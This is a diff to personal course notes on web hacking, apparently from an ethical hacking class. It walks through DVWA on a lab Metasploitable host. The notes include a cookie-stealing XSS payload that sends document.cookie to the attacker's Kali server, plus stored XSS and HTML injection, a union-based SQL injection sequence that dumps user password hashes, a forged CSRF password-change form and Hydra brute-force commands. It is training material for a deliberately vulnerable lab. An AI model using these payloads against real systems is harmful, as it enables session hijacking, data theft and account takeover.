@@ -860,6 +860,7 @@ Server username: www-data
 - victim server does'nt store .js
 - send link with js code
 - set security=low
+- code run only once on script post
 - http://<metasploitable ip>/dvwa/vulnerabilities/xss_r/
 ```
 <script>alert('Waf')</script>
@@ -883,3 +884,82 @@ python -m http.server 8001
 ```
 <Script>document.write('<img src="http://<kali ip>:8001/' + document.cookie + ' ">');</Script>
 ```
+
+### stored xss
+- code stored server-side (example = comment on a blog)
+- set metasploitable security=low -> no data filter
+- navigate to xss stored : - http://<metasploitable ip>/dvwa/vulnerabilities/xss_s/
+- code run on every page load
+- sevurity=medium -> data filtering -> need to edit DOM maxlength pram for name field (with inspect tool)
+  - `<Script>alert('Waf')</Script>` run=success
+
+### html injection
+- inject html
+- http://<metasploitable ip>/dvwa/vulnerabilities/xss_r/ and - http://<metasploitable ip>/dvwa/vulnerabilities/xss_s/
+- html examples :
+  - \<h1\>PATATE\<\/h1>
+  - \<meta http-equiv="refresh" content=0; url=http://google.com" \/\> : create infinite failed refresh loop
+  
+### sql inject
+- http://<metasploitable ip>/dvwa/vulnerabilities/sqli
+- error based sqli when we get error msg
+  - 2' and '1'='1
+  - 2' order by 1 -- '
+  - 2' order by 2 -- '
+  - 2' order by 3 -- ' - return error so there is only 2 columns
+  - 2' union select database(),user() -- ' return
+      - ID: 2' union select database(),user() -- '
+      - First name: dvwa -> db name
+      - Surname: root@localhost -> 
+  - 2' union select schema_name, 2 from information_schema.schemata -- '
+    -> return all DB infos
+  - 2' union select table_name, 2 from information_schema.tables where table_schema = 'dvwa' -- '
+    -> get list of tables for db=dvwa
+  - 2' union select column_name, column_type from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' -- '
+    -> get list of all column (including user and password column)
+  - 2' union SELECT concat(user_id,':',first_name,':',last_name), concat(user,':',password) from dvwa.users -- ' 
+    -> get list of username-hashed passw, it looks like md5hash, use md5 decoder to decode password, if it's a simple password it's easy to find
+
+- blind sqli when no error displayed
+
+### CSRF (cross side request forgery)
+- exploit any web request in current web session with vulnerability = exec payload on other website on current web session
+- http://<metasploitable ip>/dvwa/vulnerabilities/csrf view page source and copy form fiv, to create a new html page and serve it with apache2 kali instance (/var/www/html), access it via http://localhost/csrf.html
+```
+    <form action="http://<metasploitable ip>/dvwa/vulnerabilities/csrf/" method="GET">    New password:<br>
+    <input type="password" AUTOCOMPLETE="off" name="password_new" value="new_psw"><br>
+    Confirm new password: <br>
+    <input type="password" AUTOCOMPLETE="off" name="password_conf" value="new_psw">
+    <br>
+    <input type="submit" value="Change" name="Change">
+    </form>
+```
+- action : redirect
+- field_name : add value with html value balise
+- access http://localhost/csrf.html to change psw and login back to app with new psw to test it
+- redo the same operation with full html page code to look similar : http://<kali ip>/csrf_full.html CSS file missing
+- add css file in csrf html page :
+  - get css files +js file + ico files + copy them in /var/www/html update their paths in csrf_full.html : got to page source, click css file link and copy them
+
+### BruteForce with Hydra
+- general syntax : `└─$ hydra <metasploitable ip> http-form-post "/dvwa/login.php:<user field name>=^USER^:<psw field name>=^PASS^&<submit button name>=<submit button type>:<option add failed login string to search for>"`
+- fields names are to be found in page source
+- login page :
+```
+┌──(kali㉿kali)-[~]
+└─$ hydra <metasploitable ip>  http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed"  -L usernames.txt -P passwords.txt 
+```
+- http://<metasploitable ip>/dvwa/vulnerabilities/brute page
+  - get cookie with burpsuite
+```
+┌──(kali㉿kali)-[~]
+└─$ hydra <metasploitable ip> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=4............."  -L usernames.txt -P passwords.txt
+```
+
+### BruteForce with Burpsuite Intruder
+- right click on intercepted request/send to intruder/follow steps
+
+# Section 14 : login BruteForce
+- section not followed; however you can find this example code provided by the teacher of ZTM udemy classes in python project folder
+
+# Section 15 : Man in the middle
